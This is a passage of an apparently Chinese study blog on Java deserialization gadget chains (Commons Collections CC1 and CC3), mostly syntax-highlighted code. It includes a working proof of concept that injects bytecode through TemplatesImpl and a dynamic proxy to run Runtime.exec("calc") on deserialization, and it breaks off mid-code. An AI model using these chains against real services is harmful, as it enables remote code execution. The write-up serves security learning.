string">"InstantiateTransformer: Constructor must be public"</span><span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InstantiateTransformer: Constructor threw an exception"</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="CC1链中动态代理写法的补充"><a href="#CC1链中动态代理写法的补充" class="headerlink" title="CC1链中动态代理写法的补充"></a>CC1链中动态代理写法的补充</h3><p>学CC链才发现，这些内容真的是一环扣一环，由于相隔时间太久，导致前面的都快忘完了。然后到动态代理方法这里，一点印象都没有了，所以重新看一下。<br>首先<code>lazyMap</code>的<code>get</code>方法会调用其<code>decorated trasformer</code>的<code>transform</code>，让我们只需触发<code>get</code>。这是前面<code>lazyMap</code>写法的CC1链用到的。<br>现在从前往后看看。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        var1<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AnnotationType var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var2 <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Map var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Iterator var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Entry var5 <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String var6 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class <span class="token class-name">var7</span> <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                Object var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var7<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var8 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var5<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Method<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>在<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法中有这么一行，<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>调用了可控<code>memberValues的entrySet()</code>。<br>如果我们通过另一个<code>AnnotationInvocationHandler</code>对象A动态代理对象B，那么就会调用对象A的<code>invoke</code>方法。<br>观察<code>AnnotationInvocationHandler.invoke()</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">,</span> Method var2<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">equalsImpl</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var5<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span><span class="token string">"Too many parameters for an annotation method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span> var7 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token operator">-</span><span class="token number">1776922004</span><span class="token operator">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">147696667</span><span class="token operator">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var7 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">1444986633</span><span class="token operator">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    var7 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                Object var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IncompleteAnnotationException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ExceptionProxy<span class="token punctuation">)</span>var6<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Array<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cloneArray</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> var6<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>发现了<code>get</code>方法，</p><pre class=" language-java"><code class="language-java"><span class="token keyword">default</span><span class="token operator">:</span>    Object var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们再让B为<code>lazymap</code>，不就能执行<code>lazyMap.get</code>了嘛。<br>于是仿照网上的动态代理代码，写出下面的POC</p><pre class=" language-java"><code class="language-java">        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        Class <span class="token class-name">cls</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor ct <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> ct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map1<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o <span class="token operator">=</span> ct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassClassPath<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Target<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc3</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        TemplatesImpl templatesImpl<span class="token operator">=</span><span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//接下来只需templatesImpl.newTransformer()</span>        <span class="token comment" spellcheck="true">//制作chain</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//把commonscollections1的东西拼上</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor c<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map zhangsan<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler stuHandler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>zhangsan<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map stuProxy <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> stuHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>stuProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> TemplatesImpl <span class="token function">getTemplates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        ClassPool classPool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String shell <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> shellCode <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>shellCode<span class="token punctuation">}</span><span class="token punctuation">;</span>        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c1</span> <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field _name <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field _bytecode <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field _tfactory <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _bytecode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _name<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"h3rmesk1t"</span><span 